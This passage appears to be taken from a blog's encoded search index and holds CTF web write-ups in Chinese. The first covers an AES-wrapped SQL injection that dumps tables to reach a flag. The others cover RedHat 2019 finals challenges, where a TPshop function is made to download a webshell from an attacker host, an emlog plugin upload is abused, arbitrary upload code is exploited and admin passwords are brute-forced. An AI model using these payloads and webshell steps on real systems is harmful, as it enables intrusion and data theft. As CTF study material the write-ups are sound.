code题","text":"&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF1A;http://47.107.232.77:49882/&#x6253;&#x5F00;&#x540E;&#x662F;&#x4E00;&#x4E2A;&#x516C;&#x53F8;&#x7684;&#x767B;&#x5F55;&#x5730;&#x5740;&#xFF0C;&#x8BD5;&#x7740;&#x7528;admin&#xFF0C;admin&#x767B;&#x5F55;&#x4E00;&#x4E0B;&#x3002; &#x8FD4;&#x56DE;&#x9519;&#x8BEF;&#xFF1A;Fatal error: Call to a member function fetch_assoc() on a non-object in /usr/share/nginx/html/login.php on line 15 &#x767B;&#x5F55;&#x6846;&#x4E0B;&#x9762;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x7F51;&#x5740;&#xFF1A;http://47.107.232.77:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09&#x8BD5;&#x7740;&#x7528;sqlmap&#x8DD1;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x6CA1;&#x6709;&#x6CE8;&#x5165;&#x3002; &#x7528;&#x5FA1;&#x5251;&#x626B;&#x4E00;&#x4E0B;&#x7F51;&#x5740;&#x3002;&#x626B;&#x51FA;&#x6765;&#x4E86;&#x4E00;&#x4E2A;&#xFF1A;http://47.107.232.77:49882/news/&#x6253;&#x5F00;&#x4E4B;&#x540E;&#x53D1;&#x73B0;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F;&#x4E00;&#x4E2A;zip&#x6587;&#x4EF6;&#xFF0C;&#x4E0B;&#x8F7D;&#x3002;&#x91CC;&#x9762;&#x662F;list&#x7F51;&#x9875;&#x7684;&#x6E90;&#x7801;&#xFF1A; 123456789101112131415161718192021&lt;?phpheader(&apos;content-type:text/html;charset=utf-8&apos;);require_once &apos;../config.php&apos;;//&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;function decode($data){ $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;); mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;); $data = mdecrypt_generic($td,base64_decode(base64_decode($data))); mcrypt_generic_deinit($td); mcrypt_module_close($td); if(substr(trim($data),-7)!==&apos;hxb2018&apos;){ echo &apos;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&apos;; }else{ return substr(trim($data),0,strlen(trim($data))-7); }}$id=decode($_GET[&apos;id&apos;]);$sql=&quot;select id,title,content,time from notice where id=$id&quot;;$info=$link-&gt;query($sql);$arr=$info-&gt;fetch_assoc();?&gt; &#x4ECE;&#x6E90;&#x7801;&#x53EF;&#x77E5;&#xFF0C;&#x8FD9;&#x91CC;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x6CE8;&#x5165;&#x7684;&#x70B9;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x8D4B;&#x503C;id&#x53D8;&#x91CF;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8FD8;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x4E2A;&#x4E00;&#x4E2A;&#x89E3;&#x7801;&#x8FC7;&#x7A0B;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5728;&#x6CE8;&#x5165;&#x7684;&#x65F6;&#x5019;&#x8981;&#x5148;&#x5C06;&#x6211;&#x4EEC;&#x7684;payload&#x8FDB;&#x884C;&#x7F16;&#x7801;&#x3002; &#x7F16;&#x7801;&#x51FD;&#x6570;&#x770B;&#x8D77;&#x6765;&#x5F88;&#x590D;&#x6742;&#xFF0C;&#x8BD5;&#x7740;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x3002; &#x4EE3;&#x7801;&#x5206;&#x6790;&#x524D;&#x9762;&#x4F7F;&#x7528;&#x4E86;PHP mcrypt&#x52A0;&#x5BC6;&#x6269;&#x5C55;&#xFF1A; &#x6253;&#x5F00;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x548C;&#x6A21;&#x5F0F; mcrypt_module_open(&#x2018;tripledes&#x2019;, &#x2018;&#x2019;, ecb&#x2019;&#x2019;, &#x2018;&#x2019;); &#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x4F7F;&#x7528;&#x7684;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x7684;&#x540D;&#x79F0;&#xFF0C;&#x5BF9;&#x5E94;mcrypt_list_algorithms()&#x8F93;&#x51FA;&#x7684;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#xFF1B;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x5BF9;&#x5E94;&#x52A0;&#x5BC6;&#x7684;&#x6A21;&#x5F0F;&#xFF0C;&#x5BF9;&#x5E94;mcrypt_list_modes()&#x8F93;&#x51FA;&#x7684;&#x652F;&#x6301;&#x52A0;&#x5BC6;&#x6A21;&#x5F0F;&#x3002; &#x53EF;&#x77E5;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x6E90;&#x7801;&#x4F7F;&#x7528;&#x7684;&#x662F;AES&#x7B97;&#x6CD5;&#xFF0C;&#x5E76;&#x4E14;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x4E3A;&#xFF1A;MCRYPT_RIJNDAEL_128&#xFF0C;&#x52A0;&#x5BC6;&#x6A21;&#x5F0F;&#x4E3A;&#xFF1A;MCRYPT_MODE_CBC&#x3002; &#x521B;&#x5EFA;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF; (&#x8FD9;&#x9898;&#x6E90;&#x7801;&#x6CA1;&#x6709;&#x7528;&#x5230;) mcrypt_create_iv (mcrypt_enc_get_iv_size($td), MCRYPT_RAND); PS.&#x5728;Window&#x5E73;&#x53F0;&#x4E0B;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x56FA;&#x5B9A;&#x4F7F;&#x7528;MCRYPT_RAND &#x521D;&#x59CB;&#x5316;&#x52A0;&#x5BC6;&#x7F13;&#x51B2;&#x533A;mcrypt_generic_init($td, $key, $iv);$td&#x4E3A;&#x8FD4;&#x56DE;&#x7684;&#x52A0;&#x5BC6;&#x63CF;&#x8FF0;&#x7B26;&#xFF0C;$key&#x4E3A;&#x52A0;&#x5BC6;&#x5BC6;&#x94A5;&#xFF0C;$iv&#x4E3A;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF; &#x8FD9;&#x9898;&#x6E90;&#x7801;&#x7684;&#x89E3;&#x5BC6;&#x5BC6;&#x94A5;&#x4E3A;&#xFF1A;ydhaqPQnexoaDuW3 &#x8FD9;&#x91CC;&#x7684;iv&#x5B83;&#x76F4;&#x63A5;&#x63D0;&#x4F9B;&#x4E86;&#xFF1A;2018201920202021 &#x6570;&#x636E;&#x52A0;&#x5BC6; (&#x9898;&#x76EE;&#x5F53;&#x4E2D;&#x7528;&#x7684;&#x662F;&#x89E3;&#x5BC6;) $encrypted_data = mcrypt_generic($td, $data); $td&#x4E3A;&#x52A0;&#x5BC6;&#x63CF;&#x8FF0;&#x7B26;&#xFF0C;$data&#x4E3A;&#x52A0;&#x5BC6;&#x524D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6570;&#x636E;&#x52A0;&#x5BC6;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002; &#x9898;&#x76EE;&#x6E90;&#x7801;&#x5F53;&#x4E2D;&#x5C06;data&#x6570;&#x636E;&#x8FDB;&#x884C;&#x4E86;&#x4E24;&#x6B21;base64&#x7F16;&#x7801;&#xFF0C;&#x518D;&#x8FDB;&#x884C;AES&#x89E3;&#x5BC6;&#x3002; &#x7ED3;&#x675F;&#x89E3;&#x5BC6;&#xFF0C;&#x6267;&#x884C;&#x6E05;&#x7406;&#x5DE5;&#x4F5C; mcrypt_generic_deinit($td); &#x5728;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#x540E;&#x9762;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x8BED;&#x53E5;&#xFF1A; 12345if(substr(trim($data),-7)!==&apos;hxb2018&apos;){ echo &apos;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&apos;;}else{ return substr(trim($data),0,strlen(trim($data))-7);} &#x5224;&#x65AD;&#x89E3;&#x5BC6;&#x540E;&#x7684;data&#x6570;&#x636E;&#x5F53;&#x4E2D;&#x6700;&#x540E;&#x662F;&#x5426;&#x6709;hxb2018&#x5B57;&#x7B26;&#xFF0C;&#x5982;&#x679C;&#x627E;&#x5230;&#x5E76;&#x5C06;&#x5B83;&#x5220;&#x9664;&#x8FD4;&#x56DE;&#x5904;&#x7406;&#x540E;&#x7684;data&#x3002; &#x90A3;&#x4E48;&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x6784;&#x9020;&#x52A0;&#x5BC6;&#x7684;&#x601D;&#x8DEF;&#x5C31;&#x4E3A;&#xFF1A;&#xFF08;&#xFF08;&#xFF08;&#xFF08;&#x6784;&#x9020;&#x7684;&#x8BED;&#x53E5;+hxb2018&#xFF09;AES&#x52A0;&#x5BC6;&#xFF09;base64&#x52A0;&#x5BC6;&#xFF09;base64&#x52A0;&#x5BC6;&#xFF09; &#x6253;&#x5F00;&#x4E00;&#x4E2A;AES&#x52A0;&#x89E3;&#x5BC6;&#x7684;&#x5728;&#x7EBF;&#x5DE5;&#x5177;&#xFF1A;http://tool.chacuo.net/cryptaes (&#x586B;&#x5145;&#x4E3A;zero) &#x6784;&#x9020;&#x4E00;&#x4E2A;&#x8BED;&#x53E5;&#xFF1A;1 and 1=2 union select 1,2,3,4hxb2018 &#x586B;&#x5165;&#x6B63;&#x786E;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x76F4;&#x63A5;&#x52A0;&#x5BC6;&#x3002;&#xFF08;&#x8FD9;&#x91CC;&#x5DF2;&#x7ECF;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x6B21;base64&#x52A0;&#x5BC6;&#xFF09; 0hMY7i4yFMb48GTM7O6GEssuXfsRxn4Y0k5vZ9cRUUF6X4uM6Hu1P &#x518D;&#x8FDB;&#x884C;&#x4E00;&#x6B21;base64&#x52A0;&#x5BC6; MGhNWTdpNHlGTWI0OEdUTTdPNkdFc3N1WGZzUnhuNFkwazV2WjljUlVVRjZYNHVNNkh1MVAvaTR4bDRoTE9lQw== &#x8BBF;&#x95EE;&#xFF1A;http://47.107.232.77:49882/news/list.php?id=MGhNWTdpNHlGTWI0OEdUTTdPNkdFc3N1WGZzUnhuNFkwazV2WjljUlVVRjZYNHVNNkh1MVAvaTR4bDRoTE9lQw== &#x51FA;&#x73B0;&#x6807;&#x9898;&#x4E3A;2&#xFF0C;&#x5185;&#x5BB9;&#x4E3A;3.&#x5219;&#x77E5;&#x9053;&#x4E86;&#x663E;&#x793A;&#x4F4D;&#x7F6E;&#x3002;&#x7EE7;&#x7EED; &#x7206;&#x6570;&#x636E;&#x5E93;&#x540D;1 and 1=2 union select 1,database(),version(),4hxb2018&#x5F97;&#x5230;&#x6570;&#x636E;&#x5E93;&#x540D;&#x4E3A;&#xFF1A;mozhe_discuz_stormgroup &#x7206;&#x8868;&#x540D;1 and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x2019;mozhe_discuz_stormgroup&#x2019;hxb2018&#x53EF;&#x5F97;&#x51FA;&#x8868;&#x540D;&#x4E3A;&#xFF1A;notice,notice2,stormgroup_member &#x627E;&#x5B57;&#x6BB5;&#x540D;1 and 1=2 union select 1,group_concat(COLUMN_NAME),group_concat(COLUMN_TYPE),4 from information_schema.COLUMNS where TABLE_SCHEMA=&#x2019;mozhe_discuz_stormgroup&#x2019; and TABLE_NAME=&#x2019;stormgroup_member&#x2019;hxb2018 notice&#x8868;&#xFF1A;id,title,content,timeint(4),varchar(200),varchar(2000),varchar(200) notice2&#x8868;&#xFF1A;id,titleint(4),varchar(200) stormgroup_member&#x8868;id,name,password,statusint(11),varchar(20),varchar(255),int(11) &#x8BFB;&#x6570;&#x636E;&#x4ECE;stormgroup_member&#x8868;&#x4E2D;&#x53EF;&#x4EE5;&#x8BFB;&#x51FA;&#x8D26;&#x53F7;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x4F46;&#x662F;&#x767B;&#x5F55;&#x4E4B;&#x540E;&#x53D1;&#x73B0;&#x8FD8;&#x662F;&#x62A5;&#x9519;&#x3002; &#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x518D;&#x770B;&#x4E00;&#x4E0B;&#x5176;&#x4ED6;&#x7684;&#x4E24;&#x4E2A;&#x8868;&#xFF0C;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x8BD5;&#x4E00;&#x4E0B;notice2&#x8868;&#xFF0C;notice&#x8868;&#x4E00;&#x6837;&#x7684;&#x64CD;&#x4F5C;&#x3002; 1 and 1=2 union select 1,group_concat(id),group_concat(title),4 from mozhe_discuz_stormgroup.notice2hxb2018 &#x76F4;&#x63A5;&#x53EF;&#x4EE5;&#x5F97;&#x51FA;flag&#xFF1A;hxb2018{1b4092cd183df0d2d1a96bcd3099d3d5} &#x53C2;&#x8003;https://blog.csdn.net/qq_42357070/article/details/82878357https://www.cnblogs.com/huyihao/p/6028753.html","link":"/2018/01/01/湖湘杯check_code/"},{"title":"2019 RedHat决赛 Writeup","text":"Threezh1 Jokuuy Playmaker 2019&#x5E74;11&#x6708;23&#x65E5; &#x79BB;&#x7ED3;&#x675F;&#x53EA;&#x6709;40&#x591A;&#x5206;&#x949F;&#x4E86;&#xFF0C;web&#x9898;ak&#x4E86;&#x4E4B;&#x540E;&#x4E0D;&#x4F1A;&#x4FEE;&#x2026; &#x628A;wp&#x5199;&#x4E00;&#x4E0B;&#x5427;&#x3002;web&#x56DB;&#x4E2A;&#x9898;&#x90FD;&#x662F;&#x7B80;&#x5355;&#x7684;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x9898;&#x3002; &#x7CA4;&#x6E7E;&#x57FA;&#x91D1;&#x5730;&#x5740;&#xFF1A; http://172.16.9.41:9005/ &#x662F;&#x4E00;&#x4E2A;TPshop&#x7684;&#x5546;&#x57CE;&#x6846;&#x67B6;&#xFF0C;&#x754C;&#x9762;&#x5982;&#x56FE;&#x6240;&#x793A;&#xFF1A; &#x6F0F;&#x6D1E;&#x6587;&#x4EF6;&#xFF1A;\\application\\home\\controller\\Test.php &#x6F0F;&#x6D1E;&#x51FD;&#x6570;&#xFF1A;dlfile() 123456789101112public function dlfile($file_url, $save_to){ $ch = curl_init(); curl_setopt($ch, CURLOPT_POST, 0); curl_setopt($ch,CURLOPT_URL,$file_url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $file_content = curl_exec($ch); curl_close($ch); $downloaded_file = fopen($save_to, &apos;w&apos;); fwrite($downloaded_file, $file_content); fclose($downloaded_file);} &#x672C;&#x5730;&#x5199;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x4E00;&#x53E5;&#x8BDD;&#x7684;&#x6728;&#x9A6C;(shell.txt)&#x7136;&#x540E;&#x8BBF;&#x95EE;&#xFF1A; 1/Home/Test/dlfile?file_url=http://xxxx/shell.txt&amp;save_to=/var/www/html/shell.php &#x7136;&#x540E;&#x7528;&#x8681;&#x5251;&#x8FDE;&#x63A5;&#xFF1A;/shell.php &#x5373;&#x53EF;&#x3002; &#x7CA4;&#x6E7E;&#x671F;&#x8D27;&#x5730;&#x5740;&#xFF1A; http://172.16.9.41:9006/ &#x662F;&#x4E00;&#x4E2A;emlog&#x642D;&#x5EFA;&#x7684;&#x7AD9;&#x70B9;&#xFF0C;&#x4EE5;&#x524D;&#x6253;&#x7B97;&#x5BA1;&#x7684;&#xFF0C;&#x653E;&#x5F03;&#x4E86;&#x3002;&#x754C;&#x9762;&#x5982;&#x4E0B;&#xFF1A; &#x627E;&#x5230;&#x540E;&#x53F0;&#x8DEF;&#x5F84;&#xFF1A;/admin/ &#x7528;&#x6237;&#x540D;admin&#xFF0C;&#x7206;&#x7834;&#x51FA;&#x5BC6;&#x7801;&#x4E3A;admin12345 &#x8FDB;&#x5165;&#x540E;&#x53F0; &#x540E;&#x53F0;&#x6709;&#x4E00;&#x4E2A;&#x4E0A;&#x4F20;&#x63D2;&#x4EF6;&#x7684;&#x70B9;&#xFF0C;&#x9A8C;&#x8BC1;&#x538B;&#x7F29;&#x5305;&#x683C;&#x5F0F;&#x7684;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A; 1234567891011121314151617181920212223function emUnZip($zipfile, $path, $type = &apos;tpl&apos;) { if (!class_exists(&apos;ZipArchive&apos;, FALSE)) { return 3;//zip&#x6A21;&#x5757;&#x95EE;&#x9898; } $zip = new ZipArchive(); if (@$zip-&gt;open($zipfile) !== TRUE) { return 2;//&#x6587;&#x4EF6;&#x6743;&#x9650;&#x95EE;&#x9898; } $r = explode(&apos;/&apos;, $zip-&gt;getNameIndex(0), 2); $dir = isset($r[0]) ? $r[0] . &apos;/&apos; : &apos;&apos;; switch ($type) { case &apos;tpl&apos;: $re = $zip-&gt;getFromName($dir . &apos;header.php&apos;); if (false === $re) return -2; break; case &apos;plugin&apos;: $plugin_name = substr($dir, 0, -1); $re = $zip-&gt;getFromName($dir . $plugin_name . &apos;.php&apos;); if (false === $re) return -1; break; ... &#x4ECE;&#x4EE3;&#x7801;&#x53EF;&#x77E5;&#xFF0C;&#x4E00;&#x4E2A;&#x63D2;&#x4EF6;&#x540D;&#x5B57;&#x53EB;&#x505A;plugin&#xFF0C;&#x538B;&#x7F29;&#x5305;&#x91CC;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x5C31;&#x9700;&#x8981;&#x4E3A;plugin/plugin.php&#xFF0C;&#x4E0D;&#x7136;&#x683C;&#x5F0F;&#x5C31;&#x4F1A;&#x9A8C;&#x8BC1;&#x9519;&#x8BEF;&#x3002; &#x5C06;&#x4E00;&#x53E5;&#x8BDD;&#x7684;shell&#x5199;&#x5165;plugin.php&#xFF0C;&#x4E0A;&#x4F20;&#x4E4B;&#x540E;&#x4F1A;&#x88AB;&#x89E3;&#x538B;&#xFF0C;&#x7136;&#x540E;&#x8BBF;&#x95EE;&#x5373;&#x53EF;getshell&#x3002; &#x7CA4;&#x6E7E;&#x6295;&#x8D44;&#x5730;&#x5740;&#xFF1A; http://172.16.9.41:9007/ &#x9648;&#x5E08;&#x5085;&#x4EE5;&#x524D;&#x5BA1;&#x8FC7;&#x7684;&#x4E00;&#x4E2A;cms&#xFF0C;&#x5FEB;&#x901F;&#x7684;&#x62FF;&#x5230;&#x4E86;&#x4E00;&#x8840;&#x3002;&#x5F53;&#x65F6;&#x6CA1;&#x6709;&#x622A;&#x5230;&#x8FD9;&#x4E2A;cms&#x7684;&#x56FE;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x76F4;&#x63A5;&#x770B;&#x5177;&#x4F53;&#x7684;&#x4EE3;&#x7801;&#x5427;&#xFF1A; &#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF1A; echo/Apps/Home/Controller/UploadfileController.class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129/** * [index &#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x4EE3;&#x7801;] * @return [type] [description] */public function index(){ if(IS_POST){ /** * 1&#x3001;&#x5982;&#x679C;&#x662F;&#x56FE;&#x7247;&#x76F4;&#x63A5;&#x8C03;&#x7528;uploadPhoto() * 2&#x3001;&#x5982;&#x679C;&#x662F;&#x66FF;&#x4ED6;&#x9644;&#x4EF6;&#x5219;&#x6309;&#x7167;&#x5F53;&#x524D;&#x914D;&#x7F6E;&#x8BBE;&#x7F6E; */ $type = I(&apos;post.type&apos;,&apos;files&apos;); $saveDir = I(&apos;post.savedir&apos;); $thumbw = I(&apos;post.thumbw&apos;); $thumbh = I(&apos;post.thumbh&apos;); $filesize = I(&apos;post.filesize&apos;); if($type == &apos;images&apos; || preg_match(&apos;/^image\\//&apos;, $_FILES[&apos;Filedata&apos;][&apos;type&apos;][0])){ $type = &quot;images&quot;; //&#x662F;&#x5426;&#x6DFB;&#x52A0;&#x6C34;&#x5370; $water = I(&apos;post.water&apos;); if($water){ $water_site = C(&apos;SITE_SYSTEM_IMG_WATER&apos;); $water_new = isset($water_site) &amp;&amp; !empty($water_site) ? $water_site : C(&apos;SYSTEM_IMG_WATER&apos;); //$info = uploadPhoto(&apos;photo/&apos;.$type.&apos;&apos;,$thumbw,$thumbh,array(&apos;open&apos;=&gt;1)); $info = uploadPhoto($saveDir.&apos;/&apos;.$type,$thumbw,$thumbh,$water_new,$filesize); } else { $info = uploadPhoto($saveDir.&apos;/&apos;.$type,$thumbw,$thumbh,&apos;&apos;,$filesize); } if(!is_array($info)){ $error_data[&apos;info&apos;] = $info; $error_data[&apos;status&apos;] = 0; $this-&gt;ajaxReturn($error_data); } $file[&apos;oringinal_type&apos;] = &apos;images&apos;; $file[&apos;status&apos;] = 1; $file[&apos;name&apos;] = $_FILES[&apos;Filedata&apos;][&apos;name&apos;][0]; $file[&apos;savename&apos;] = $info[0][&apos;savename&apos;]; $file[&apos;photo&apos;] = substr($info[0][&apos;savepath&apos;],1).$info[0][&apos;savename&apos;]; $file[&apos;thumb&apos;] = $info[0][&apos;thumbpath&apos;]; $file[&apos;location&apos;] = &apos;upload&apos;; $this-&gt;ajaxReturn($file); } else { $type = &apos;files&apos;; $upload = new \\Think\\Upload(); $upload-&gt;maxSize = $filesize*1024; //&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7684;&#x6700;&#x5927;&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#xFF0C;&#x9644;&#x4EF6;&#x6700;&#x5927;100M $upload-&gt;rootPath = &quot;./&quot;; //&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x4FDD;&#x5B58;&#x7684;&#x6839;&#x8DEF;&#x5F84; $upload-&gt;savePath = $upload-&gt;rootPath.&quot;Public/Uploads/&quot;.$saveDir.&quot;/&quot; . $type .&quot;/&quot;;//&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7684;&#x4FDD;&#x5B58;&#x8DEF;&#x5F84; $upload-&gt;saveName = date(&quot;YmdHis&quot;).&quot;_&quot;.uniqid(); //&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x89C4;&#x5219; $upload-&gt;replace = true; //&#x5B58;&#x5728;&#x540C;&#x540D;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x662F;&#x8986;&#x76D6; $upload-&gt;autoSub = true;//&#x81EA;&#x52A8;&#x4F7F;&#x7528;&#x5B50;&#x76EE;&#x5F55;&#x4FDD;&#x5B58;&#x4E0A;&#x4F20;&#x6587;&#x4EF6; $upload-&gt;subName = date(&quot;Ymd&quot;);//&#x5B50;&#x76EE;&#x5F55;&#x521B;&#x5EFA;&#x65B9;&#x5F0F;&#xFF0C;&#x91C7;&#x7528;&#x6570;&#x7EC4;&#x6216;&#x8005;&#x5B57;&#x7B26;&#x4E32;&#x65B9;&#x5F0F;&#x5B9A;&#x4E49; $upload-&gt;hash = true;//&#x662F;&#x5426;&#x751F;&#x6210;&#x6587;&#x4EF6;&#x7684;hash&#x7F16;&#x7801; &#x9ED8;&#x8BA4;&#x4E3A;true if(!$info = $upload-&gt;upload()){ $error_data[&apos;status&apos;] = 0; $error_data[&apos;info&apos;] = $upload-&gt;getError(); $this-&gt;ajaxReturn($error_data); } else { //&#x5904;&#x7406;&#x6587;&#x4EF6;&#x56FE;&#x6807; //excel if(in_array($info[0][&apos;ext&apos;], array(&apos;xls&apos;,&apos;xlsx&apos;))){ $info[0][&apos;ext&apos;] = &apos;xls&apos;; } //ppt if(in_array($info[0][&apos;ext&apos;], array(&apos;ppt&apos;,&apos;pptx&apos;))){ $info[0][&apos;ext&apos;] = &apos;ppt&apos;; } //word if(in_array($info[0][&apos;ext&apos;], array(&apos;doc&apos;,&apos;docx&apos;))){ $info[0][&apos;ext&apos;] = &apos;doc&apos;; } //&#x97F3;&#x9891; if(in_array($info[0][&apos;ext&apos;], array(&apos;wma&apos;,&apos;mp3&apos;,&apos;mid&apos;,&apos;wav&apos;))){ $info[0][&apos;ext&apos;] = &apos;mp3&apos;; } //&#x89C6;&#x9891; if(in_array($info[0][&apos;ext&apos;], array(&apos;avi&apos;,&apos;mov&apos;,&apos;mpeg&apos;,&apos;mpg&apos;,&apos;swf&apos;,&apos;mp4&apos;))){ $info[0][&apos;ext&apos;] = &apos;vedio&apos;; } //zip if(in_array($info[0][&apos;ext&apos;], array(&apos;zip&apos;,&apos;rar&apos;,&apos;7z&apos;))){ $info[0][&apos;ext&apos;] = &apos;zip&apos;; } //&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x5219;&#x53D6;&#x9ED8;&#x8BA4;&#x56FE;&#x7247; if(!file_exists(&quot;./Public/images/uploadfile/&quot;.$info[0][&apos;ext&apos;].&quot;.png&quot;)){ $info[0][&apos;ext&apos;] = &quot;readme&quot;; } $info[0][&apos;status&apos;] = 1; $info[0][&apos;oringinal_type&apos;] = &apos;files&apos;; $info[0][&apos;savepathall&apos;] = substr($info[0][&apos;savepath&apos;],1).$info[0][&apos;savename&apos;]; $info[0][&apos;location&apos;] = &apos;upload&apos;; $this-&gt;ajaxReturn($info[0]); } } } else { //&#x7F29;&#x7565;&#x56FE;&#x914D;&#x7F6E; $site_thumbw = C(&apos;SITE_SYSTEM_THUMB_WIDTH&apos;); $site_thumbh = C(&apos;SITE_SYSTEM_THUMB_HEIGHT&apos;); $thumbw = isset($site_thumbw) &amp;&amp; !empty($site_thumbw) ? C(&apos;SITE_SYSTEM_THUMB_WIDTH&apos;) : C(&apos;SYSTEM_THUMB_WIDTH&apos;); $thumbh = isset($site_thumbh) &amp;&amp; !empty($site_thumbh) ? C(&apos;SITE_SYSTEM_THUMB_HEIGHT&apos;) : C(&apos;SYSTEM_THUMB_HEIGHT&apos;); $this-&gt;thumbw = I(&apos;get.thumbw&apos;,$thumbw); $this-&gt;thumbh = I(&apos;get.thumbh&apos;,$thumbh); $this-&gt;thumbw = $this-&gt;thumbw === 0 ? $thumbw : $this-&gt;thumbw; $this-&gt;thumbh = $this-&gt;thumbh === 0 ? $thumbh : $this-&gt;thumbh; $this-&gt;type = I(&apos;get.type&apos;,&apos;&apos;); //&#x7C7B;&#x578B; $this-&gt;myid = I(&apos;get.myid&apos;,&apos;&apos;); //&#x8FD4;&#x56DE;&#x5BB9;&#x5668;&#x5185;&#x5BB9;&#x7684;&#x503C; $this-&gt;iframe = I(&apos;get.iframe&apos;,&apos;&apos;); //&#x8FD4;&#x56DE;&#x7684;iframe&#x5BB9;&#x5668; $this-&gt;field = I(&apos;get.field&apos;,&apos;&apos;); $this-&gt;returntype = I(&apos;get.returntype&apos;,&apos;multiple&apos;); //&#x8FD4;&#x56DE;&#x6587;&#x4EF6;&#x7684;&#x4E2A;&#x6570;&#x7C7B;&#x578B;&#xFF0C;&#x5355;&#x4E2A;-single&#xFF0C;&#x591A;&#x4E2A;-multiple&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;&#x591A;&#x4E2A; //&#x63A7;&#x5236;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x5927;&#x5C0F; $this-&gt;filesize = I(&apos;get.filesize&apos;); if(empty($this-&gt;filesize)){ if($this-&gt;type == &apos;images&apos;){ $this-&gt;filesize = 3072; //&#x56FE;&#x7247;&#x9ED8;&#x8BA4;3M } else { $this-&gt;filesize = 102400; //&#x9644;&#x4EF6;&#x9ED8;&#x8BA4;100M } } //&#x4E0A;&#x4F20;&#x76EE;&#x5F55; $this-&gt;savedir = I(&apos;get.savedir&apos;,&apos;uploadfile&apos;); $this-&gt;display(); }} &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6CA1;&#x5BF9;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x540E;&#x7F00;&#x9A8C;&#x8BC1;&#xFF0C;&#x53EF;&#x9020;&#x6210;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x3002;&#x76F4;&#x63A5;getshell&#x3002; &#x7CA4;&#x6E7E;&#x79DF;&#x8D41;&#x5730;&#x5740;&#xFF1A; http://172.16.9.41:9008/ &#x4E00;&#x4E2A;ecshop&#x7684;&#x5546;&#x57CE;&#x6846;&#x67B6;&#xFF0C;&#x7248;&#x672C;&#x8FD8;&#x633A;&#x65B0;&#x7684;&#x3002;(&#x91CC;&#x9762;&#x7684;&#x5546;&#x54C1;&#x90FD;&#x662F;&#x5C0F;&#x7C73;&#x7684;&#xFF1F;&#xFF1F;&#xFF1F;) &#x754C;&#x9762;&#x5982;&#x4E0B;&#xFF1A; &#x8DDF;&#x7B2C;&#x4E8C;&#x9898;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x7206;&#x7834;&#x8FDB;&#x5165;&#x540E;&#x53F0;&#x3002; &#x7528;&#x6237;&#x540D;&#xFF1A;admin &#x5BC6;&#x7801;&#xFF1A;admin123 